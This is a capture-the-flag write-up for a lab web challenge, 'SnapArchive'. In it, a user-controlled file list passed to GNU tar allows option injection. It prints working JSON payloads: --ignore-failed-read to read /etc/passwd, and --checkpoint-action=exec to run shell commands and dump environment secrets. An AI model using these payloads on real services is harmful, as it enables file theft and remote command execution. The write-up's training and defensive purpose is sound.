# FlagYard CTF — SnapArchive

**Writeup by [Fares Badaj](https://www.linkedin.com/in/FaresBadaj)**

> **Fares Badaj** — *Red Team Operator | Penetration Tester Specialist*
>
> **Telegram:** [@ptok3](https://t.me/ptok3) • **GitHub:** [github.com/FaresBadaj](https://github.com/FaresBadaj) • **LinkedIn:** [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj) • **Credly:** [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

- **Platform:** FlagYard (Lab Training CTF)
- **Author:** SAFCSP
- **Category:** Web
- **Difficulty:** Hard
- **Target:** `SnapArchive` v1.4.2 — a document-backup web app running under redpwn/jail (NOSJ infrastructure).

> *"Upload a few documents, select the ones you care about, and click 'Create backup'..."*

---

## The flag

```
FlagY{66a99564eefb215581b0783462a36b25}
```

---

## The short version

1. Every TCP connection gets a **fresh redpwn/jail instance** — keep-alive
   matters, because all state (uploads, backups) lives in that instance's
   `/tmp` and disappears when the socket closes.
2. Creating a backup runs **GNU tar with user-controlled arguments**:
   the `files[]` array is spliced straight into
   `tar -czf <name> -C /tmp/data/uploads ${files}`.
3. Because GNU tar accepts **options mixed with operands**, an entry like
   `--ignore-failed-read` is parsed as a real tar option. That turns the
   backup feature into an **arbitrary file‑read / directory-listing oracle**.
4. `--to-command=` is a trap: it is only honored during tar **extraction**,
   so it does nothing on `-c` (create).
5. The win is `--checkpoint-action=exec=CMD` — GNU tar runs `CMD` through
   `/bin/sh` **while creating the archive**. That is full command execution
   as the app user (`bun`).
6. `env` shows the flag in the process environment:
   `DYN_FLAG=FlagY{66a99564eefb215581b0783462a36b25}`.

---

## First look at the app

`GET /api/info` leaks the whole layout:

```json
{
  "service": "SnapArchive",
  "version": "1.4.2",
  "storage": {
    "uploadsDir": "/tmp/data/uploads",
    "backupsDir": "/tmp/data/backups",
    "uploadedFiles": 1,
    "backupArchives": 0
  }
}
```

Uploads go to `POST /api/files` (`{filename, content}`), backups to
`POST /api/backup` (`{archiveName, files[]}`), and both are downloaded from
`GET /api/files/<name>` / `GET /api/backup/<name>.tar.gz`.

Two properties define the whole challenge:

1. **Per-connection jail.** The app listens on stdin/stdout behind a
   redpwn/jail wrapper (`src/jail-server.ts`); each TCP session is a brand-new
   instance with its own tmpfs. Upload a file, then list it on a *second*
   request over a new connection → it's gone. Over the **same** keep-alive
   connection → it stays. So persistence is real, but only inside one session.

2. **Trusted `files[]`.** In `src/http-core.ts`:

```typescript
await $`tar -czf ${archivePath} -C ${UPLOAD_DIR} ${files}`.quiet();
```

The backend validates only the *type* and *length* of each entry
(max 20 entries × 300 chars) — it deliberately trusts that entries name
files inside the uploads folder. Nothing stops an entry from being an
**absolute path** (e.g. `/etc/passwd`) or a **tar option** (`--...`).

---

## Trick 1: arbitrary file-read via option injection

GNU tar's argument parser lets options appear anywhere among operands.
Sending:

```json
{
  "archiveName": "leak",
  "files": ["--ignore-failed-read", "/etc/passwd", "readme.txt"]
}
```

downloads a tar.gz whose content is /etc/passwd. Drop `--ignore-failed-read`
and a missing path makes tar exit non-zero → the app returns 502, which is a
nice **existence oracle**. Archives of whole directories (`/`, `/home`,
`/srv`, `/app` …) return their file listings, so filesystem discovery is
straightforward.

The flag is *not* a readable file though: `/flag.txt`, `/flag`, `/app/flag.txt`
and friends all return 502 or empty. The flag lives in the **environment**.

## Trick 2: why `--to-command` is a trap

GNU tar's `--to-command=CMD` pipes each member's content to `CMD`.
I verified (locally + against the target) that it produces **no side effects
during `-c`** — by design the docs say it applies while *extracting*. So the
whole "pipe the flag to me" idea with `--to-command` gives nothing.

## Trick 3: command execution via `--checkpoint-action`

GNU tar supports checkpoint actions, and `exec` is the dangerous one:

```
--checkpoint-action=exec=COMMAND
```

This runs `COMMAND` through `/bin/sh` at checkpoints *during creation*.
Combined with `--checkpoint=1` it fires constantly while the archive is being
built. The jail cwd is the uploads dir, and — crucially — the process runs as
the app's `bun` user inside the same instance, so its environment is the one
we want:

```json
{
  "archiveName": "ck",
  "files": [
    "--checkpoint=1",
    "--checkpoint-action=exec=env > /tmp/data/uploads/zz2.txt",
    "readme.txt"
  ]
}
```

then `GET /api/files/zz2.txt` returns:

```
TAR_ARCHIVE=/tmp/data/backups/ck.tar.gz
DATA_DIR=/tmp/data
DYN_FLAG=FlagY{66a99564eefb215581b0783462a36b25}
TAR_FORMAT=gnu
...
```

---

## Solver

`snaparch_solve.py` — does the whole chain inside **one keep-alive TCP
session** (one jail instance): opens the socket, sends the checkpoint RCE
backup, pulls the env dump from `/api/files`, parses `DYN_FLAG`, and writes
`flag_from_snaparch.txt`:

```
python snaparch_solve.py

╔══════════════════════════════════════════════════════════════════╗
║            S N A P A R C H I V E   S O L V E R                    ║
║   tar --checkpoint-action exec RCE | env leak | NOSJ jail        ║
╚══════════════════════════════════════════════════════════════════╝
[*] opening one keep-alive jail session (state persists per conn)...
[*] env dump captured (207 bytes)
[+] saved ...\Web\1-SnapArchive\flag_from_snaparch.txt

        FLAG  RECOVERED
        FlagY{66a99564eefb215581b0783462a36b25}
```

---

## Tools

- Raw **HTTP/1.1 socket** scripting (keep-alive, no external deps) — to hold
  one jail instance open for the whole chain.
- **GNU tar** (v1.35 on the target) — option injection, `--ignore-failed-read`
  file-read oracle, `--checkpoint-action=exec` RCE.
- Source dump of the app (`src/http-core.ts`, `src/jail-server.ts`,
  `src/server.ts`, `run`) extracted *via the file-read oracle itself* — every
  component was readable because the source ships inside `/app`.

---

## Takeaways

- **`files[]` arrays that get string-interpolated into a CLI are an injection
  surface** — GNU options and operands are mixed by design, so a "filename
  list" can smuggle `--ignore-failed-read`, `--checkpoint-action=exec=...`,
  `--to-command`, etc.
- **`tar --to-command` runs at extract time, not create time.** For
  `tar -czf ...` the code-execution lever is `--checkpoint-action=exec`.
- **Jails are not shared state.** redpwn/jail-style per-connection instances
  mean exploits must run and consume results within a single keep-alive
  session (or be idempotent across connections).
- **Not every flag is a file.** When `/flag.txt` is a 502, check the process
  environment — `env` is often exactly what a checkpoint action is for.

---

## Credit

- **Author:** [Fares Badaj](https://www.linkedin.com/in/FaresBadaj) — [@ptok3](https://t.me/ptok3)